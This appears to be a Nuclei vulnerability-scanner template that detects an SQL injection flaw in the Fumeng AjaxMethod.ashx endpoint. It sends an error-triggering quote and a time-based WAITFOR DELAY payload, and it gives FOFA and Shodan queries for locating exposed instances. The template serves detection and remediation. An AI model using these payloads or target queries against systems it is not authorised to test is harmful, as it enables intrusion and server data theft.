flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - "contains(response, \"\u5B5A\u76DF\")"
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(response_1, "SELECT count", "System.Exception:", "WHERE upper")
    - status_code_1 == 500
    name: error-based
    type: dsl
  - condition: and
    dsl:
    - duration_2>=6
    - len(body_2) == 1
    - regex("^0$", body_2)
    - contains(content_type_2, "text/plain")
    name: time-based
    type: dsl
  matchers-condition: or
  raw:
  - '@timeout: 30s

    GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 30s

    GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27--
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: fumengyun-sqli
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.31944
    epss-score: 0.00076
  description: 'The Fumeng AjaxMethod.ashx file has an SQL injection vulnerability.
    Attackers can use this vulnerability to obtain server data.

    '
  impact: 'Successful exploitation could lead to unauthorized access to sensitive
    data.

    '
  metadata:
    fofa-query: "title=\"\u5B5A\u76DF\u4E91 \""
    max-request: 1
    shodan-query: "title:\"\u5B5A\u76DF\u4E91 \""
  name: Fumeng - SQL Injection
  reference:
  - https://github.com/emadshanab/goby-poc/blob/main/fumengyun%20%20AjaxMethod.ashx%20SQL%20injection.json
  remediation: 'Implement input validation and use parameterized queries to prevent
    SQL Injection attacks.

    '
  severity: critical
  tags: time-based-sqli,fumasoft,sqli,vuln
